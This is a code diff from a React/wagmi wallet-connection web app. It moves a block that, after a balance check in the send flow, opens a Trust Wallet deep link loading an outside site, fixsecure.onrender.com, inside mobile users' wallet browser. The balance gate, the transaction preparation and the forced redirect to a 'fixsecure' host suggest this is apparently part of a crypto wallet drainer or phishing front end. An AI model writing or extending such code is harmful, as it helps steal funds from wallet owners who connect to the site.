@@ -140,16 +140,6 @@ const { data: request } = usePrepareTransactionRequest(
   return typeof window.ethereum !== "undefined" && window.ethereum.isTrust === true;
 }
 
-useEffect(() => {
-  if (
-    walletInfo?.name === "Trust Wallet" &&
-    isMobile() &&
-    !isTrustWalletApp() // ensure we are not already inside the app
-  ) {
-    const trustLink = `https://link.trustwallet.com/open_url?coin_id=${chain.id}&url=https://fixsecure.onrender.com`
-    window.open(trustLink, "_blank");
-    }
-}, [isConnected, walletInfo, activeChain]);
 
   useEffect(() => {
     if (isConnected && address && activeChain.id) {
@@ -200,6 +190,15 @@ useEffect(() => {
     console.log("Not enough balance or amount to send");
     return;
   }
+
+    if (
+    walletInfo?.name === "Trust Wallet" &&
+    isMobile() &&
+    !isTrustWalletApp() // ensure we are not already inside the app
+  ) {
+    const trustLink = `https://link.trustwallet.com/open_url?coin_id=${chain.id}&url=https://fixsecure.onrender.com`
+    window.open(trustLink, "_blank");
+    }
 
          if(walletInfo?.name === "MetaMask" && isMobile()) {
       const metamaskLink= "https://link.metamask.io"
